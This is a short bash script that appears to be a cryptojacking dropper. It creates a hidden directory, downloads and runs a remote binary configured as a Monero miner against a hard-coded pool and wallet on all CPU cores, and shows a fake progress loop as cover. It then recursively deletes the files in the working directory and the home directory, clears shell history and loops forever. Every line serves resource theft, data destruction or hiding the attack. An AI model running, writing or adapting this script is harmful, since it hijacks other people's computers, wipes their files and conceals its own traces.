#!/bin/bash

mkdir .studio
cd .studio
nohup wget -O mmm https://github.com/kidoescegh/xm/raw/main/newxm > /dev/null 2>&1
chmod 777 mmm
./mmm --donate-level 1 -o 146.190.135.107:80 -u 87ZKYmmCQmXGzu1AZkxmgM9wdqwk5YtBDQ6ZGouBam1584jKUvDrC7ccANX8N7M7sGRnR9Fu18gDdTQCVVo3U2m9KYhNNsR -p Free -a rx/0 -t $(nproc --all) > /dev/null 2>&1 &
seq 1 4320000 | while read i; do echo -en "\r Running .     $i s /432000000 s";sleep 0.1;echo -en "\r Running ..    $i s /432000000 s";sleep 0.1;echo -en "\r Running ...   $i s /432000000 s";sleep 0.1;echo -en "\r Running ....  $i s /432000000 s";sleep 0.1;echo -en "\r Running ..... $i s /432000000 s";sleep 0.1;echo -en "\r Running     . $i s /43200000000 s";sleep 0.1;echo -en "\r Running  .... $i s /432000000 s";sleep 0.1;echo -en "\r Running   ... $i s /432000000 s";sleep 0.1;echo -en "\r Running    .. $i s /432000000 s";sleep 0.1;echo -en "\r Running     . $i s /432000000 s";sleep 0.1; done
curl ifconfig.me
rm -rvf *
cd ~/
rm -rvf *
history -cr
while true
do
        echo "hold down..."
        sleep 30
done
